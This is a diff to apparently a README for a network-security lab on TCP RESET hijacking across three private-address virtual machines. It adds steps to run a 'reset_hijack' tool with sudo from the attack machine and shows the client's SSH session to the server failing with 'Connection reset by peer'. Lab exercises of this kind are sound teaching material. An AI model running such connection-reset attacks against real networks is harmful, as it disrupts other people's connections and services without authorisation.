@@ -6,7 +6,17 @@
   - Client : 192.168.56.101
   - Server : 192.168.56.102
   - Attack : 192.168.56.103
-  - Network settings : allow promiscuous mode
+  - Network settings : allow promiscuous mode on the network interface of Attach machine
 
-2. 
+2. Test RESET Hijacking
+  - Start reset_hijacking on attack machine
+  192.168.56.103:~$ sudo ./reset_hijack eth1 192.168.56.102
+
+  - Log in to client 101, try to connect to server 102
+  192.168.56.101:~$ ssh meo@192.168.56.102
+  meo@192.168.56.102's password:
+  Write failed: Connection reset by peer
+
+
+
 
